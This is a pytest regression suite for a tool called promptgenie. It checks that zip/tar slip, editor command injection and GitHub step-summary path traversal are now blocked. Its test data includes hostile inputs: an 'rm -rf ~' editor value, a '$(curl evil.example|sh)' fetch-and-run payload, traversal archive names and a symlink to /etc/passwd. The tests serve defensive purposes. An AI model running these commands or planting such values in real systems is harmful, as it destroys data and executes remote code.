"""Regression tests for the Snyk 991aba0 hardening pass.

Each test asserts that a specific attack vector flagged by Snyk is now blocked:

  - CWE-22 Tar Slip (zip)  — input_handler streams members, never extracts;
                             unsafe members abort the archive.
  - CWE-22 Tar Slip (tar)  — registry.install_from_local validates the single
                             manifest member and rejects symlinks / traversal /
                             unsafe pack ids without extracting to disk.
  - CWE-78 Command injection — template_cmd only launches allowlisted editors.
  - CWE-23 Path traversal  — gh_reporter confines GITHUB_STEP_SUMMARY writes to
                             $RUNNER_TEMP when running inside Actions.
"""

from __future__ import annotations

import io
import tarfile
import zipfile
from pathlib import Path

import pytest

# ---------------------------------------------------------------------------
# CWE-22 — zip: members are streamed, never written to disk
# ---------------------------------------------------------------------------


class TestZipNoDiskExtraction:
    def test_zip_member_never_written_to_disk(self, tmp_path, monkeypatch):
        """collect_files must not call extractall or write member files out."""
        from promptgenie.core import input_handler

        # Make absolutely sure no extractall slips back in.
        def _boom(*_a, **_k):  # pragma: no cover - only hit on regression
            raise AssertionError("extractall must never be called")

        monkeypatch.setattr(zipfile.ZipFile, "extractall", _boom)

        arc = tmp_path / "archive.zip"
        with zipfile.ZipFile(arc, "w") as zf:
            zf.writestr("notes.md", "# hello")

        result = input_handler.collect_files([str(arc)])
        assert result.file_count == 1
        assert result.files[0].content == "# hello"
        assert "archive.zip" in result.files[0].path

    def test_zip_bomb_member_rejected_by_byte_cap(self, tmp_path):
        """A member larger than the per-file cap is skipped, not loaded."""
        from promptgenie.core import input_handler

        arc = tmp_path / "big.zip"
        with zipfile.ZipFile(arc, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("huge.txt", "A" * 4096)

        result = input_handler.collect_files([str(arc)], max_file_bytes=1024)
        assert result.file_count == 0
        assert any(s.reason == "too_large" for s in result.skipped)

    def test_zip_with_traversal_aborts_whole_archive(self, tmp_path):
        from promptgenie.core import input_handler

        arc = tmp_path / "evil.zip"
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr(zipfile.ZipInfo("../../escape.md"), "pwned")
        arc.write_bytes(buf.getvalue())

        result = input_handler.collect_files([str(arc)])
        assert result.file_count == 0
        assert any("zip_error" in s.reason for s in result.skipped)


# ---------------------------------------------------------------------------
# CWE-22 — tar: install_from_local validates the single manifest member
# ---------------------------------------------------------------------------


def _make_tarball(path: Path, add: list[tuple[tarfile.TarInfo, bytes | None]]) -> None:
    with tarfile.open(path, "w:gz") as tf:
        for info, payload in add:
            tf.addfile(info, io.BytesIO(payload) if payload is not None else None)


class TestTarInstallHardening:
    def test_symlink_manifest_is_not_installed(self, tmp_path):
        """A symlink masquerading as pack.yaml must never be installed.

        Selection already filters to regular files, so the symlink is rejected
        before extraction (defence in depth) — install must fail and write
        nothing.
        """
        from promptgenie.core.registry import install_from_local

        tarball = tmp_path / "pack.tar.gz"
        link = tarfile.TarInfo("pack.yaml")
        link.type = tarfile.SYMTYPE
        link.linkname = "/etc/passwd"
        _make_tarball(tarball, [(link, None)])

        out = tmp_path / "out"
        with pytest.raises(ValueError):
            install_from_local(str(tarball), install_dir=out)
        assert not out.exists() or list(out.iterdir()) == []

    def test_assert_safe_tar_member_rejects_dangerous_types(self):
        from promptgenie.core.registry import _assert_safe_tar_member

        sym = tarfile.TarInfo("pack.yaml")
        sym.type = tarfile.SYMTYPE
        with pytest.raises(ValueError, match="link"):
            _assert_safe_tar_member(sym)

        dev = tarfile.TarInfo("pack.yaml")
        dev.type = tarfile.CHRTYPE
        with pytest.raises(ValueError, match="device"):
            _assert_safe_tar_member(dev)

        absolute = tarfile.TarInfo("/etc/passwd")
        absolute.type = tarfile.REGTYPE
        with pytest.raises(ValueError, match="absolute"):
            _assert_safe_tar_member(absolute)

        traversal = tarfile.TarInfo("../../escape.yaml")
        traversal.type = tarfile.REGTYPE
        with pytest.raises(ValueError, match="traversal"):
            _assert_safe_tar_member(traversal)

    def test_rejects_unsafe_pack_id(self, tmp_path):
        from promptgenie.core.registry import install_from_local

        tarball = tmp_path / "pack.tar.gz"
        payload = b"id: ../../escape\nname: Evil\ntype: rules\n"
        info = tarfile.TarInfo("pack/pack.yaml")
        info.size = len(payload)
        _make_tarball(tarball, [(info, payload)])

        with pytest.raises(ValueError, match="pack id"):
            install_from_local(str(tarball), install_dir=tmp_path / "out")

    def test_safe_tarball_installs_without_extracting_tree(self, tmp_path):
        from promptgenie.core.registry import install_from_local

        tarball = tmp_path / "pack.tar.gz"
        payload = b"id: good-pack\nname: Good\ntype: rules\n"
        info = tarfile.TarInfo("nested/dir/pack.yaml")
        info.size = len(payload)
        _make_tarball(tarball, [(info, payload)])

        out = tmp_path / "out"
        dest = install_from_local(str(tarball), install_dir=out)
        assert dest == out / "good-pack.yaml"
        assert dest.read_text() == payload.decode()
        # Nothing else from the tarball should have been written to disk.
        assert sorted(p.name for p in out.iterdir()) == ["good-pack.yaml"]


# ---------------------------------------------------------------------------
# CWE-78 — editor allowlist
# ---------------------------------------------------------------------------


class TestEditorAllowlist:
    def test_hostile_editor_rejected(self, monkeypatch):
        from promptgenie.commands.template_cmd import _resolve_editor_command

        monkeypatch.setenv("EDITOR", "rm -rf ~")
        monkeypatch.delenv("VISUAL", raising=False)
        with pytest.raises(ValueError, match="not in the allowed editor list"):
            _resolve_editor_command()

    def test_command_substitution_payload_rejected(self, monkeypatch):
        from promptgenie.commands.template_cmd import _resolve_editor_command

        monkeypatch.setenv("EDITOR", "$(curl evil.example|sh)")
        monkeypatch.delenv("VISUAL", raising=False)
        with pytest.raises(ValueError):
            _resolve_editor_command()

    def test_allowed_editor_with_flags_passes(self, monkeypatch):
        from promptgenie.commands.template_cmd import _resolve_editor_command

        monkeypatch.setenv("EDITOR", "code --wait")
        monkeypatch.delenv("VISUAL", raising=False)
        assert _resolve_editor_command() == ["code", "--wait"]

    def test_visual_takes_precedence_and_is_validated(self, monkeypatch):
        from promptgenie.commands.template_cmd import _resolve_editor_command

        monkeypatch.setenv("VISUAL", "/usr/local/bin/vim")
        monkeypatch.setenv("EDITOR", "nano")
        assert _resolve_editor_command() == ["/usr/local/bin/vim"]


# ---------------------------------------------------------------------------
# CWE-23 — GITHUB_STEP_SUMMARY confinement
# ---------------------------------------------------------------------------


class TestStepSummaryConfinement:
    def test_path_outside_runner_temp_refused(self, tmp_path, monkeypatch):
        from promptgenie.core.gh_reporter import GHReporter

        runner_temp = tmp_path / "runner_temp"
        runner_temp.mkdir()
        outside = tmp_path / "outside.md"

        monkeypatch.setenv("GITHUB_ACTIONS", "true")
        monkeypatch.setenv("RUNNER_TEMP", str(runner_temp))

        GHReporter(summary_path=str(outside)).write_step_summary("## leak\n")
        assert not outside.exists()

    def test_traversal_path_refused(self, tmp_path, monkeypatch):
        from promptgenie.core.gh_reporter import GHReporter

        runner_temp = tmp_path / "runner_temp"
        runner_temp.mkdir()
        secret = tmp_path / "secret.txt"
        secret.write_text("original")

        monkeypatch.setenv("GITHUB_ACTIONS", "true")
        monkeypatch.setenv("RUNNER_TEMP", str(runner_temp))

        escaping = str(runner_temp / ".." / "secret.txt")
        GHReporter(summary_path=escaping).write_step_summary("## tampered\n")
        assert secret.read_text() == "original"

    def test_path_inside_runner_temp_allowed(self, tmp_path, monkeypatch):
        from promptgenie.core.gh_reporter import GHReporter

        runner_temp = tmp_path / "runner_temp"
        runner_temp.mkdir()
        summary = runner_temp / "step_summary"

        monkeypatch.setenv("GITHUB_ACTIONS", "true")
        monkeypatch.setenv("RUNNER_TEMP", str(runner_temp))

        GHReporter(summary_path=str(summary)).write_step_summary("## ok\n")
        assert "## ok" in summary.read_text()
